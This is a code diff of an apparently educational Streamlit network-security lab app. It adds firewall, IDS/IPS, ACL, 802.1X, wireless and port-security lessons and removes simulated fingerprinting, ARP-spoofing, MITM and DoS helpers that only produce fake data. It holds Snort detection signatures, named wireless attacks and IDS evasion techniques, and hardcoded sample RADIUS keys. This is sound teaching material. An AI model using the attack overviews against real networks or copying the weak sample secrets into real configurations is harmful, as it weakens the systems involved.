+        | NGFW | 3-7 | Complete protection | Complex, expensive | Enterprise |
+        
+        **Key Features:**
+        
+        1. **Access Control Lists (ACLs)**
+           - Source/destination IP
+           - Port numbers
+           - Protocols
+           - Direction (inbound/outbound)
+        
+        2. **Stateful Inspection**
+           - Connection table
+           - TCP state tracking
+           - Related connections (FTP)
+           - Session timeout
+        
+        3. **Application Control**
+           - Protocol anomaly detection
+           - Application identification
+           - Content filtering
+           - SSL/TLS inspection
+        
+        **Common Firewall Rules:**
+        - **Implicit Deny** - Block all by default
+        - **Least Privilege** - Only allow necessary
+        - **Defense in Depth** - Multiple layers
+        - **Logging** - Record all decisions
+        
+        **Best Practices:**
+        - Place most specific rules first
+        - Regular rule review and cleanup
+        - Document all rule changes
+        - Test rules before production
+        - Monitor firewall logs
+        - Implement fail-closed mode
         """)
-
-# Helper functions for new labs
-def perform_os_fingerprinting(target_ip: str, technique: str, aggressive: bool) -> Dict:
-    """Simulate OS fingerprinting"""
-    os_signatures = {
-        "Windows 10": {"ttl": 128, "window": 65535, "df": True, "confidence": 95},
-        "Ubuntu Linux": {"ttl": 64, "window": 29200, "df": True, "confidence": 88},
-        "macOS": {"ttl": 64, "window": 65535, "df": True, "confidence": 82},
-        "FreeBSD": {"ttl": 64, "window": 65535, "df": False, "confidence": 75},
-        "Cisco IOS": {"ttl": 255, "window": 4096, "df": True, "confidence": 90}
+    
+    # Firewall Types
+    st.markdown("### 🛡️ **Firewall Types**")
+    
+    fw_type = st.selectbox("Firewall Type:", ["Stateless", "Stateful", "Application", "Next-Gen (NGFW)"])
+    
+    fw_info = {
+        "Stateless": "Packet filtering based on rules, no connection tracking",
+        "Stateful": "Tracks connection state, more intelligent decisions",
+        "Application": "Layer 7 inspection, application-aware",
+        "Next-Gen (NGFW)": "IPS + Application control + User identity + SSL inspection"
     }
     
-    # Simulate detection
-    detected_os = random.choice(list(os_signatures.keys()))
-    signature = os_signatures[detected_os]
+    st.info(fw_info[fw_type])
     
-    return {
-        "os": detected_os,
-        "version": f"{detected_os} {'Pro' if 'Windows' in detected_os else 'LTS'}",
-        "confidence": signature["confidence"] + random.randint(-5, 5),
-        "technical_details": {
-            "ttl": signature["ttl"],
-            "window_size": signature["window"],
-            "df_flag": signature["df"],
-            "tcp_options": ["MSS", "SACK", "Timestamp", "NOP", "WScale"],
-            "open_ports": [22, 80, 443, 3389] if "Windows" in detected_os else [22, 80, 443]
+    # Firewall Rules Builder
+    st.markdown("### 📋 **Firewall Rule Builder**")
+    
+    col1, col2, col3 = st.columns(3)
+    
+    with col1:
+        action = st.selectbox("Action:", ["Permit", "Deny", "Log"])
+        protocol = st.selectbox("Protocol:", ["TCP", "UDP", "ICMP", "Any"])
+    
+    with col2:
+        src_ip = st.text_input("Source IP:", "192.168.1.0/24")
+        src_port = st.text_input("Source Port:", "any")
+    
+    with col3:
+        dst_ip = st.text_input("Destination IP:", "10.0.0.0/8")
+        dst_port = st.text_input("Destination Port:", "80")
+    
+    if st.button("Generate Rule", key="gen_fw_rule"):
+        if fw_type in ["Stateless", "Stateful"]:
+            # ACL format
+            rule = f"access-list 100 {action.lower()} {protocol.lower()} {src_ip} "
+            if src_port != "any":
+                rule += f"eq {src_port} "
+            rule += f"{dst_ip} "
+            if dst_port != "any":
+                rule += f"eq {dst_port}"
+            
+            st.code(rule, language="text")
+        
+        elif fw_type == "Next-Gen (NGFW)":
+            # Palo Alto format
+            st.code(f"""
+            <entry name="Rule-{random.randint(100, 999)}">
+              <from><member>trust</member></from>
+              <to><member>untrust</member></to>
+              <source><member>{src_ip}</member></source>
+              <destination><member>{dst_ip}</member></destination>
+              <service><member>{protocol.lower()}-{dst_port}</member></service>
+              <application><member>any</member></application>
+              <action>{action.lower()}</action>
+            </entry>
+            """, language="xml")
+    
+    # Zone-Based Firewall
+    st.markdown("### 🌐 **Zone-Based Firewall**")
+    
+    zones = ["Inside", "Outside", "DMZ"]
+    src_zone = st.selectbox("Source Zone:", zones)
+    dst_zone = st.selectbox("Destination Zone:", zones)
+    
+    if src_zone != dst_zone:
+        st.code(f"""
+        ! Zone definitions
+        zone security {src_zone}
+        zone security {dst_zone}
+        
+        ! Zone pair
+        zone-pair security {src_zone}-TO-{dst_zone} source {src_zone} destination {dst_zone}
+         service-policy type inspect POLICY-{src_zone}-{dst_zone}
+        
+        ! Policy map
+        policy-map type inspect POLICY-{src_zone}-{dst_zone}
+         class type inspect HTTP-TRAFFIC
+          inspect
+         class type inspect ICMP-TRAFFIC
+          pass
+         class class-default
+          drop log
+        """, language="text")
+
+def ids_ips_lab():
+    """Intrusion Detection and Prevention Systems"""
+    
+    st.markdown(create_lab_header("IDS/IPS Lab", "🛡️", "linear-gradient(90deg, #667eea 0%, #764ba2 100%)"), unsafe_allow_html=True)
+    
+    # Theory Section
+    with st.expander("📖 **IDS/IPS Theory**", expanded=True):
+        st.markdown("""
+        ### 🚨 **Understanding IDS/IPS Systems**
+        
+        Intrusion Detection Systems (IDS) monitor network traffic for suspicious activity and alert administrators, 
+        while Intrusion Prevention Systems (IPS) actively block detected threats.
+        
+        **IDS vs IPS:**
+        
+        | Aspect | IDS | IPS |
+        |--------|-----|-----|
+        | Mode | Passive monitoring | Active blocking |
+        | Deployment | Out-of-band | Inline |
+        | Action | Alert only | Alert + Block |
+        | False Positive Impact | Alerts only | Service disruption |
+        | Latency | None | Adds latency |
+        
+        **Detection Methods:**
+        
+        1. **Signature-Based**
+           - Known attack patterns
+           - Low false positives
+           - Can't detect zero-days
+           - Regular updates needed
+           - Example: Snort rules
+        
+        2. **Anomaly-Based**
+           - Baseline normal behavior
+           - Detects unknown attacks
+           - High false positives
+           - Learning period required
+           - ML/AI powered
+        
+        3. **Hybrid Approach**
+           - Combines both methods
+           - Better coverage
+           - Complex to manage
+        
+        **IDS/IPS Placement:**
+        - **Network Perimeter** - Internet edge
+        - **DMZ** - Between firewalls
+        - **Internal Segments** - Lateral movement
+        - **Critical Assets** - Database, servers
+        
+        **Common Attacks Detected:**
+        - Port scans and reconnaissance
+        - Buffer overflow exploits
+        - SQL injection attempts
+        - DoS/DDoS attacks
+        - Malware communication
+        - Data exfiltration
+        
+        **Evasion Techniques:**
+        - Fragmentation
+        - Encryption
+        - Obfuscation
+        - Timing attacks
+        - Protocol violations
+        
+        **Best Practices:**
+        - Tune rules to reduce false positives
+        - Regular signature updates
+        - Monitor IDS/IPS performance
+        - Integrate with SIEM
+        - Test with penetration testing
+        """)
+    
+    # IDS vs IPS
+    system = st.radio("System Type:", ["IDS (Detection)", "IPS (Prevention)"])
+    
+    if system == "IDS (Detection)":
+        st.info("🔍 **Passive monitoring** - Alerts on suspicious activity")
+    else:
+        st.warning("🚫 **Active blocking** - Prevents malicious traffic")
+    
+    # Signature-based Detection
+    st.markdown("### 📝 **Signature Rules**")
+    
+    # Snort rule builder
+    st.markdown("#### **Snort Rule Builder**")
+    
+    col1, col2 = st.columns(2)
+    
+    with col1:
+        rule_action = st.selectbox("Action:", ["alert", "log", "drop", "reject"])
+        rule_protocol = st.selectbox("Protocol:", ["tcp", "udp", "icmp", "ip"])
+        rule_src = st.text_input("Source:", "$HOME_NET")
+        rule_src_port = st.text_input("Src Port:", "any")
+    
+    with col2:
+        rule_direction = st.selectbox("Direction:", ["->", "<>"])
+        rule_dst = st.text_input("Destination:", "$EXTERNAL_NET")
+        rule_dst_port = st.text_input("Dst Port:", "80")
+    
+    rule_msg = st.text_input("Alert Message:", "Possible SQL Injection")
+    rule_content = st.text_input("Content Match:", "SELECT * FROM")
+    
+    if st.button("Generate Snort Rule", key="gen_snort"):
+        rule = f'{rule_action} {rule_protocol} {rule_src} {rule_src_port} {rule_direction} {rule_dst} {rule_dst_port} '
+        rule += f'(msg:"{rule_msg}"; '
+        if rule_content:
+            rule += f'content:"{rule_content}"; nocase; '
+        rule += f'sid:{random.randint(1000000, 9999999)}; rev:1;)'
+        
+        st.code(rule, language="text")
+    
+    # Attack Patterns
+    st.markdown("### 🎯 **Common Attack Patterns**")
+    
+    attack_type = st.selectbox("Attack Type:", ["Port Scan", "SQL Injection", "XSS", "Buffer Overflow", "DoS"])
+    
+    attack_signatures = {
+        "Port Scan": """
+        alert tcp any any -> $HOME_NET any (msg:"Possible Port Scan"; 
+        flags:S; threshold:type both, track by_src, count 20, seconds 10; 
+        sid:1000001;)
+        """,
+        "SQL Injection": """
+        alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
+        msg:"SQL Injection - SELECT statement"; 
+        content:"SELECT"; nocase; content:"FROM"; nocase; 
+        pcre:"/SELECT.*FROM/i"; sid:1000002;)
+        """,
+        "XSS": """
+        alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
+        msg:"XSS Attack - Script Tag"; 
+        content:"<script"; nocase; content:"</script>"; nocase; 
+        sid:1000003;)
+        """,
+        "Buffer Overflow": """
+        alert tcp any any -> any any (
+        msg:"Possible Buffer Overflow - Long String"; 
+        content:"|41 41 41 41 41 41 41 41|"; depth:1000; 
+        sid:1000004;)
+        """,
+        "DoS": """
+        alert icmp any any -> any any (
+        msg:"ICMP Flood"; 
+        threshold:type both, track by_src, count 100, seconds 1; 
+        sid:1000005;)
+        """
+    }
+    
+    if attack_type in attack_signatures:
+        st.code(attack_signatures[attack_type], language="text")
+    
+    # IPS Modes
+    st.markdown("### 🔧 **IPS Deployment Modes**")
+    
+    mode = st.selectbox("Deployment Mode:", ["Inline", "Promiscuous", "Inline-Tap"])
+    
+    mode_info = {
+        "Inline": "Traffic passes through IPS - Can block attacks",
+        "Promiscuous": "Receives copy of traffic - Detection only",
+        "Inline-Tap": "Inline monitoring without blocking capability"
+    }
+    
+    st.info(mode_info[mode])
+
+def access_control_lab():
+    """Network Access Control Lists"""
+    
+    st.markdown(create_lab_header("Access Control Lab", "🔐", "linear-gradient(90deg, #f093fb 0%, #f5576c 100%)"), unsafe_allow_html=True)
+    
+    # Theory Section
+    with st.expander("📖 **Access Control Theory**", expanded=True):
+        st.markdown("""
+        ### 🔐 **Understanding Access Control Lists (ACLs)**
+        
+        ACLs are sequential lists of permit or deny statements that filter network traffic based on 
+        specified criteria, providing granular control over data flow.
+        
+        **Why ACLs?**
+        - 🛡️ **Security** - Block unauthorized access
+        - 🎯 **Traffic Control** - Filter specific protocols/ports
+        - 📊 **QoS** - Classify traffic for prioritization
+        - 🔍 **Monitoring** - Log interesting traffic
+        
+        **ACL Types:**
+        
+        | Type | OSI Layer | Criteria | Use Case | Performance |
+        |------|-----------|----------|----------|-------------|
+        | Standard | Layer 3 | Source IP only | Basic filtering | Fast |
+        | Extended | Layer 3-4 | Source/Dest IP, Port, Protocol | Granular control | Moderate |
+        | Named | Layer 3-4 | Same as Extended + Names | Easy management | Moderate |
+        | Reflexive | Layer 4 | Dynamic stateful | Session-based | Slower |
+        | Time-based | Layer 3-4 | Time restrictions | Business hours | Moderate |
+        
+        **ACL Processing:**
+        1. **Top-Down** - Sequential evaluation
+        2. **First Match** - Stops at first match
+        3. **Implicit Deny** - Deny all at end
+        4. **No Match** - Proceeds to implicit deny
+        
+        **Wildcard Masks:**
+        - **0.0.0.0** - Match exact IP
+        - **0.0.0.255** - Match /24 network
+        - **0.0.255.255** - Match /16 network
+        - **255.255.255.255** - Match any IP
+        
+        **ACL Placement:**
+        - **Inbound** - Filter before routing
+        - **Outbound** - Filter after routing
+        - **Standard ACL** - Close to destination
+        - **Extended ACL** - Close to source
+        
+        **Common Mistakes:**
+        - Wrong wildcard mask
+        - Incorrect ACL order
+        - Forgetting implicit deny
+        - No return traffic allowed
+        - Applied wrong direction
+        
+        **Best Practices:**
+        - Most specific rules first
+        - Document each rule
+        - Use named ACLs
+        - Regular review and cleanup
+        - Test before production
+        """)
+    
+    # ACL Types
+    st.markdown("### 📋 **ACL Types**")
+    
+    acl_type = st.selectbox("ACL Type:", ["Standard", "Extended", "Named", "Reflexive", "Time-based"])
+    
+    if acl_type == "Standard":
+        st.markdown("#### **Standard ACL (1-99, 1300-1999)**")
+        
+        acl_num = st.number_input("ACL Number:", 1, 99, 10)
+        
+        st.code(f"""
+        access-list {acl_num} permit 192.168.1.0 0.0.0.255
+        access-list {acl_num} deny 10.0.0.0 0.255.255.255
+        access-list {acl_num} permit any
+        
+        interface GigabitEthernet0/1
+         ip access-group {acl_num} in
+        """, language="text")
+    
+    elif acl_type == "Extended":
+        st.markdown("#### **Extended ACL (100-199, 2000-2699)**")
+        
+        st.code("""
+        access-list 100 permit tcp 192.168.1.0 0.0.0.255 any eq 80
+        access-list 100 permit tcp 192.168.1.0 0.0.0.255 any eq 443
+        access-list 100 deny ip 192.168.1.0 0.0.0.255 10.0.0.0 0.255.255.255
+        access-list 100 permit ip any any
+        
+        interface GigabitEthernet0/1
+         ip access-group 100 in
+        """, language="text")
+    
+    elif acl_type == "Named":
+        acl_name = st.text_input("ACL Name:", "CORP_ACCESS")
+        
+        st.code(f"""
+        ip access-list extended {acl_name}
+         permit tcp 192.168.0.0 0.0.255.255 any eq 80
+         permit tcp 192.168.0.0 0.0.255.255 any eq 443
+         deny tcp any any eq 23
+         deny tcp any any eq 21
+         permit ip any any
+        
+        interface GigabitEthernet0/1
+         ip access-group {acl_name} in
+        """, language="text")
+    
+    # ACL Best Practices
+    st.markdown("### ✅ **ACL Best Practices**")
+    
+    practices = [
+        "Place extended ACLs close to source",
+        "Place standard ACLs close to destination",
+        "Order matters - most specific first",
+        "Remember implicit deny at end",
+        "Document ACL purpose",
+        "Test before production deployment"
+    ]
+    
+    for practice in practices:
+        st.success(f"✓ {practice}")
+
+def nac_lab():
+    """Network Access Control (802.1X)"""
+    
+    st.markdown(create_lab_header("NAC Lab", "🌐", "linear-gradient(90deg, #FA8BFF 0%, #2BD2FF 50%, #2BFF88 100%)"), unsafe_allow_html=True)
+    
+    # Theory Section
+    with st.expander("📖 **NAC Theory**", expanded=True):
+        st.markdown("""
+        ### 🌐 **Understanding Network Access Control (NAC)**
+        
+        NAC is a security solution that enforces policy-based access control for devices attempting to 
+        access network resources, ensuring only compliant and authorized devices gain access.
+        
+        **Why NAC?**
+        - 🔒 **Zero Trust** - Verify before trust
+        - 📱 **BYOD Security** - Control personal devices
+        - 🛡️ **Compliance** - Enforce security policies
+        - 🔍 **Visibility** - Know what's on your network
+        - 🚫 **Threat Prevention** - Block non-compliant devices
+        
+        **NAC Process:**
+        
+        1. **Discovery** → Device connects to network
+        2. **Authentication** → User/device identity verification
+        3. **Posture Assessment** → Check compliance
+        4. **Authorization** → Grant appropriate access
+        5. **Remediation** → Fix non-compliant devices
+        6. **Monitoring** → Continuous compliance checking
+        
+        **NAC Components:**
+        
+        | Component | Function | Examples |
+        |-----------|----------|----------|
+        | Policy Server | Central control | Cisco ISE, Aruba ClearPass |
+        | Enforcement Points | Apply policies | Switches, Wireless, VPN |
+        | Agents | Device assessment | Persistent, Dissolvable |
+        | Guest Portal | Visitor access | Captive portal |
+        | RADIUS/TACACS+ | Authentication | AAA services |
+        
+        **802.1X Authentication:**
+        - **Supplicant** - Client device requesting access
+        - **Authenticator** - Switch/AP enforcing access
+        - **Authentication Server** - RADIUS validating credentials
+        
+        **Posture Assessment Checks:**
+        - **Antivirus** - Updated and running
+        - **OS Patches** - Latest security updates
+        - **Firewall** - Enabled and configured
+        - **Registry** - Security settings
+        - **Applications** - Authorized software
+        - **Certificates** - Valid device certificates
+        
+        **Access Control Methods:**
+        - **802.1X** - Port-based authentication
+        - **MAC Authentication Bypass (MAB)** - For non-802.1X devices
+        - **Web Authentication** - Portal-based
+        - **VPN** - Remote access control
+        
+        **Enforcement Actions:**
+        - **Allow** - Full network access
+        - **Deny** - No network access
+        - **Quarantine** - Limited remediation access
+        - **Restrict** - Limited network segments
+        - **Redirect** - To remediation portal
+        
+        **Best Practices:**
+        - Start with monitoring mode
+        - Gradual enforcement rollout
+        - Clear remediation process
+        - Guest access policies
+        - Regular policy updates
+        - Integration with SIEM
+        """)
+    
+    # 802.1X Components
+    st.markdown("### 🔐 **802.1X Components**")
+    
+    col1, col2, col3 = st.columns(3)
+    
+    with col1:
+        st.info("**Supplicant**\nClient device requesting access")
+    
+    with col2:
+        st.info("**Authenticator**\nSwitch/AP controlling access")
+    
+    with col3:
+        st.info("**Authentication Server**\nRADIUS server validating credentials")
+    
+    # 802.1X Configuration
+    st.markdown("### ⚙️ **802.1X Configuration**")
+    
+    device = st.selectbox("Device Type:", ["Switch", "Wireless Controller"])
+    
+    if device == "Switch":
+        st.code("""
+        ! Global Configuration
+        aaa new-model
+        aaa authentication dot1x default group radius
+        dot1x system-auth-control
+        
+        ! RADIUS Server
+        radius server ISE
+         address ipv4 192.168.1.100 auth-port 1812 acct-port 1813
+         key RadiusSecret123
+        
+        ! Interface Configuration
+        interface GigabitEthernet0/1
+         switchport mode access
+         switchport access vlan 10
+         authentication port-control auto
+         dot1x pae authenticator
+         dot1x timeout tx-period 10
+         dot1x max-req 2
+        
+        ! Guest VLAN
+        interface GigabitEthernet0/1
+         authentication event fail action authorize vlan 999
+         authentication event no-response action authorize vlan 999
+        """, language="text")
+    
+    # MAB (MAC Authentication Bypass)
+    st.markdown("### 📱 **MAB Configuration**")
+    
+    st.code("""
+    interface GigabitEthernet0/1
+     authentication order dot1x mab
+     authentication priority dot1x mab
+     mab
+    
+    ! For devices that don't support 802.1X
+    ! MAC address authenticated against RADIUS
+    """, language="text")
+    
+    # Dynamic VLAN Assignment
+    st.markdown("### 🏷️ **Dynamic VLAN Assignment**")
+    
+    st.code("""
+    ! RADIUS Attributes for VLAN Assignment
+    Tunnel-Type = VLAN
+    Tunnel-Medium-Type = IEEE-802
+    Tunnel-Private-Group-ID = 100
+    
+    ! Switch accepts VLAN from RADIUS
+    interface GigabitEthernet0/1
+     authentication event server alive action reinitialize
+     authentication host-mode multi-domain
+    """, language="text")
+
+def wireless_security_lab():
+    """Wireless Network Security"""
+    
+    st.markdown(create_lab_header("Wireless Security Lab", "📡", "linear-gradient(90deg, #00C9FF 0%, #92FE9D 100%)"), unsafe_allow_html=True)
+    
+    # Theory Section
+    with st.expander("📖 **Wireless Security Theory**", expanded=True):
+        st.markdown("""
+        ### 📡 **Understanding Wireless Security**
+        
+        Wireless networks face unique security challenges due to their broadcast nature, making proper 
+        security controls essential to prevent unauthorized access and data interception.
+        
+        **Wireless Security Evolution:**
+        - **Open** - No security (Never use!)
+        - **WEP** - Broken, 24-bit IV (Deprecated)
+        - **WPA** - TKIP, 48-bit IV (Legacy)
+        - **WPA2** - AES-CCMP (Current standard)
+        - **WPA3** - SAE, PFS (Latest standard)
+        
+        **Security Standards Comparison:**
+        
+        | Standard | Encryption | Authentication | Vulnerabilities | Use Case |
+        |----------|------------|----------------|-----------------|----------|
+        | WEP | RC4 | Shared Key | Easily cracked | Never |
+        | WPA | TKIP/RC4 | PSK/802.1X | KRACK attacks | Legacy only |
+        | WPA2 | AES-CCMP | PSK/802.1X | KRACK, Dictionary | Current |
+        | WPA3 | AES-GCMP | SAE/802.1X | Limited | Recommended |
+        
+        **Common Wireless Attacks:**
+        
+        1. **Evil Twin**
+           - Fake AP with same SSID
+           - Man-in-the-middle position
+           - Credential harvesting
+        
+        2. **Deauthentication**
+           - Force client disconnection
+           - Capture handshake
+           - DoS attack
+        
+        3. **WPS Attacks**
+           - Brute force PIN
+           - Pixie dust attack
+           - 11,000 combinations only
+        
+        4. **KRACK Attack**
+           - Key Reinstallation
+           - WPA2 vulnerability
+           - Decrypt traffic
+        
+        **Wireless Security Features:**
+        - **PMF** - Protected Management Frames
+        - **OWE** - Opportunistic Wireless Encryption
+        - **SAE** - Simultaneous Authentication of Equals
+        - **Forward Secrecy** - Past sessions secure
+        
+        **Enterprise vs Personal:**
+        
+        | Feature | Personal (PSK) | Enterprise (802.1X) |
+        |---------|---------------|-------------------|
+        | Key Management | Single shared | Per-user keys |
+        | Authentication | Password only | Username + Password |
+        | Scalability | Small networks | Large networks |
+        | Accounting | None | Full logging |
+        | Complexity | Simple | Complex |
+        
+        **Best Practices:**
+        - Use WPA3 where possible
+        - Strong, unique passwords
+        - Disable WPS
+        - Hide SSID (defense in depth)
+        - MAC filtering (additional layer)
+        - Regular firmware updates
+        - Separate guest networks
+        - Monitor for rogue APs
+        """)
+    
+    # Encryption Standards
+    st.markdown("### 🔒 **Wireless Encryption**")
+    
+    encryption = st.selectbox("Encryption Standard:", ["WEP", "WPA", "WPA2", "WPA3"])
+    
+    encryption_info = {
+        "WEP": {
+            "Security": "❌ Weak - Deprecated",
+            "Encryption": "RC4",
+            "Key Length": "40/104 bits",
+            "Authentication": "Open/Shared Key"
         },
-        "fingerprint_data": signature
-    }
-
-def create_fingerprint_visualization(data: Dict):
-    """Create OS fingerprint visualization"""
-    fig = make_subplots(
-        rows=2, cols=2,
-        subplot_titles=("TTL Analysis", "Window Size", "TCP Options", "Port Signature"),
-        specs=[[{"type": "bar"}, {"type": "scatter"}],
-               [{"type": "pie"}, {"type": "heatmap"}]]
-    )
-    
-    # TTL comparison
-    fig.add_trace(
-        go.Bar(x=["Target", "Windows", "Linux", "macOS"], 
-               y=[data.get("ttl", 64), 128, 64, 64],
-               marker_color=["red", "blue", "green", "orange"]),
-        row=1, col=1
-    )
-    
-    # Window size timeline
-    fig.add_trace(
-        go.Scatter(x=list(range(10)), 
-                   y=[data.get("window", 65535) + random.randint(-1000, 1000) for _ in range(10)],
-                   mode="lines+markers"),
-        row=1, col=2
-    )
-    
-    # TCP Options distribution
-    options = ["MSS", "SACK", "Timestamp", "WScale", "NOP"]
-    values = [random.randint(10, 30) for _ in options]
-    fig.add_trace(
-        go.Pie(labels=options, values=values),
-        row=2, col=1
-    )
-    
-    fig.update_layout(height=600, showlegend=False)
-    return fig
-
-def simulate_arp_attack(victim_ip: str, gateway_ip: str, mode: str) -> Dict:
-    """Simulate ARP spoofing attack"""
-    return {
-        "packets_sent": random.randint(100, 1000),
-        "success_rate": random.randint(75, 95),
-        "captured_traffic": [
-            {"Time": f"00:00:{i:02d}", "Source": victim_ip, "Dest": gateway_ip, 
-             "Protocol": random.choice(["HTTP", "HTTPS", "DNS", "SSH"]),
-             "Info": f"Packet {i+1}"}
-            for i in range(10)
-        ]
-    }
-
-def simulate_ssl_mitm(target: str, method: str) -> Dict:
-    """Simulate SSL/TLS MITM attack"""
-    return {
-        "target": target,
-        "method": method,
-        "certificate_info": {
-            "issuer": "Fake CA",
-            "subject": target.replace("https://", ""),
-            "valid_from": datetime.now().isoformat(),
-            "valid_to": (datetime.now() + timedelta(days=365)).isoformat(),
-            "fingerprint": hashlib.sha256(target.encode()).hexdigest()[:40]
+        "WPA": {
+            "Security": "⚠️ Better - Legacy",
+            "Encryption": "TKIP with RC4",
+            "Key Length": "128 bits",
+            "Authentication": "PSK/Enterprise"
         },
-        "intercepted_data": {
-            "cookies": ["session_id=abc123", "auth_token=xyz789"],
-            "headers": {"User-Agent": "Mozilla/5.0", "Accept": "text/html"},
-            "form_data": {"username": "victim", "password": "***hidden***"}
+        "WPA2": {
+            "Security": "✅ Strong - Current Standard",
+            "Encryption": "AES-CCMP",
+            "Key Length": "128 bits",
+            "Authentication": "PSK/Enterprise"
+        },
+        "WPA3": {
+            "Security": "✅✅ Strongest - Latest",
+            "Encryption": "AES-GCMP-256",
+            "Key Length": "192/256 bits",
+            "Authentication": "SAE/Enterprise"
         }
     }
+    
+    info = encryption_info[encryption]
+    for key, value in info.items():
+        st.info(f"**{key}:** {value}")
+    
+    # WPA2 Enterprise
+    st.markdown("### 🏢 **WPA2-Enterprise Configuration**")
+    
+    st.code("""
+    ! Wireless LAN Controller Configuration
+    
+    config wlan security wpa enable 1
+    config wlan security wpa wpa2 enable 1
+    config wlan security wpa wpa2 ciphers aes enable 1
+    config wlan security wpa akm 802.1x enable 1
+    
+    ! RADIUS Configuration
+    config radius auth add 1 192.168.1.100 1812 ascii RadiusKey123
+    config radius acct add 1 192.168.1.100 1813 ascii RadiusKey123
+    
+    ! EAP Methods
+    config wlan security eap-params enable fast 1
+    config wlan security eap-params enable peap 1
+    config wlan security eap-params enable tls 1
+    """, language="text")
+    
+    # Rogue AP Detection
+    st.markdown("### 🚨 **Rogue AP Detection**")
+    
+    detection_method = st.selectbox("Detection Method:", ["WIDS", "Manual Scanning", "Client Reports"])
+    
+    if detection_method == "WIDS":
+        st.code("""
+        ! Cisco WLC Rogue Detection
+        config rogue detection enable
+        config rogue detection monitor-mode enable
+        config rogue auto-contain level 3
+        
+        ! Rogue Classification Rules
+        config rogue rule add priority 1 rule1
+        config rogue rule condition add rule1 ssid Corporate-Fake
+        config rogue rule action add rule1 contain
+        
+        ! Alert Configuration
+        config rogue detection report-interval 30
+        config rogue detection min-rssi -70
+        """, language="text")
 
-def simulate_dos_attack(attack_type: str) -> None:
-    """Simulate DoS attack visualization"""
-    # Create real-time attack visualization
-    placeholder = st.empty()
-    for i in range(10):
-        with placeholder.container():
-            st.metric("🎯 Attack Progress", f"{i*10}%", f"↑ {i*100} packets")
-            time.sleep(0.5)
-    st.success("✅ Attack simulation completed!")
+def port_security_lab():
+    """Switch Port Security"""
+    
+    st.markdown(create_lab_header("Port Security Lab", "🔍", "linear-gradient(90deg, #FC466B 0%, #3F5EFB 100%)"), unsafe_allow_html=True)
+    
+    # Theory Section
+    with st.expander("📖 **Port Security Theory**", expanded=True):
+        st.markdown("""
+        ### 🔍 **Understanding Port Security**
+        
+        Port security is a Layer 2 security feature that restricts input to an interface by limiting and 
+        identifying MAC addresses allowed to access the port, preventing unauthorized devices.
+        
+        **Why Port Security?**
+        - 🚫 **MAC Flooding Prevention** - Stop CAM table overflow
+        - 🔒 **Unauthorized Access** - Block rogue devices
+        - 📍 **Device Tracking** - Know what connects where
+        - 🛡️ **Layer 2 Protection** - First line of defense
+        - 📊 **Compliance** - Meet security requirements
+        
+        **Port Security Features:**
+        
+        1. **MAC Address Limiting**
+           - Maximum allowed MACs per port
+           - Static or dynamic learning
+           - Aging timer for dynamic MACs
+        
+        2. **Sticky MAC Learning**
+           - Dynamically learn and save
+           - Converts to static entries
+           - Survives reboot
+        
+        3. **Violation Modes:**
+        
+        | Mode | Action | Syslog | SNMP Trap | Counter | Port State |
+        |------|--------|--------|-----------|---------|------------|
+        | Shutdown | Err-disable | Yes | Yes | Yes | Down |
+        | Restrict | Drop frames | Yes | Yes | Yes | Up |
+        | Protect | Drop frames | No | No | No | Up |
+        
+        **Common Attacks Prevented:**
+        - **CAM Table Overflow** - MAC flooding attack
+        - **MAC Spoofing** - Impersonation
+        - **DHCP Starvation** - Resource exhaustion
+        - **Unauthorized Devices** - Rogue connections
+        
+        **Port Security Configuration:**
+        ```
+        switchport port-security
+        switchport port-security maximum [1-8192]
+        switchport port-security mac-address [MAC/sticky]
+        switchport port-security violation [mode]
+        switchport port-security aging time [minutes]
+        ```
+        
+        **DHCP Snooping Integration:**
+        - Builds binding table
+        - Tracks IP-MAC-Port mappings
+        - Prevents DHCP attacks
+        - Foundation for DAI and IP Source Guard
+        
+        **Dynamic ARP Inspection (DAI):**
+        - Validates ARP packets
+        - Uses DHCP snooping database
+        - Prevents ARP spoofing
+        - Rate limiting capability
+        
+        **IP Source Guard:**
+        - Filters IP traffic
+        - Validates source IP
+        - Uses DHCP snooping binding
+        - Prevents IP spoofing
+        
+        **Best Practices:**
+        - Start with low MAC limits
+        - Use sticky learning for static devices
+        - Restrict mode for critical ports
+        - Monitor violation logs
+        - Document MAC addresses
+        - Regular security audits
+        """)
+    
+    # Port Security Configuration
+    st.markdown("### 🔐 **Port Security Configuration**")
+    
+    col1, col2 = st.columns(2)
+    
+    with col1:
+        max_mac = st.number_input("Maximum MAC Addresses:", 1, 10, 2)
+        violation_mode = st.selectbox("Violation Mode:", ["Shutdown", "Restrict", "Protect"])
+    
+    with col2:
+        sticky = st.checkbox("Sticky MAC Learning", value=True)
+        aging = st.number_input("Aging Time (min):", 0, 1440, 0)
+    
+    config = f"""
+    interface GigabitEthernet0/1
+     switchport mode access
+     switchport port-security
+     switchport port-security maximum {max_mac}
+     switchport port-security violation {violation_mode.lower()}
+    """
+    
+    if sticky:
+        config += " switchport port-security mac-address sticky\n"
+    
+    if aging > 0:
+        config += f" switchport port-security aging time {aging}\n"
+        config += " switchport port-security aging type inactivity\n"
+    
+    st.code(config, language="text")
+    
+    # Violation Actions
+    st.markdown("### ⚠️ **Violation Actions Explained**")
+    
+    actions = {
+        "Shutdown": "Port enters error-disabled state, requires manual intervention",
+        "Restrict": "Drops packets, sends SNMP trap, increments violation counter",
+        "Protect": "Drops packets silently, no alerts"
+    }
+    
+    for action, description in actions.items():
+        if action == violation_mode:
+            st.success(f"**{action}:** {description}")
+        else:
+            st.info(f"**{action}:** {description}")
+    
+    # DHCP Snooping
+    st.markdown("### 🛡️ **DHCP Snooping**")
+    
+    st.code("""
+    ! Global Configuration
+    ip dhcp snooping
+    ip dhcp snooping vlan 10,20,30
+    
+    ! Trusted Interface (Uplink to DHCP Server)
+    interface GigabitEthernet0/24
+     ip dhcp snooping trust
+    
+    ! Untrusted Interface (Client Ports)
+    interface range GigabitEthernet0/1-23
+     ip dhcp snooping limit rate 10
+    
+    ! Verification
+    show ip dhcp snooping
+    show ip dhcp snooping binding
+    """, language="text")
+
+def arp_security_lab():
+    """ARP Security and DAI"""
+    
+    st.markdown(create_lab_header("ARP Security Lab", "🎭", "linear-gradient(90deg, #f093fb 0%, #f5576c 100%)"), unsafe_allow_html=True)
+    
+    # Theory Section
+    with st.expander("📖 **ARP Security Theory**", expanded=True):
+        st.markdown("""
+        ### 🎭 **Understanding ARP Security**
+        
+        Address Resolution Protocol (ARP) maps IP addresses to MAC addresses but lacks authentication, 
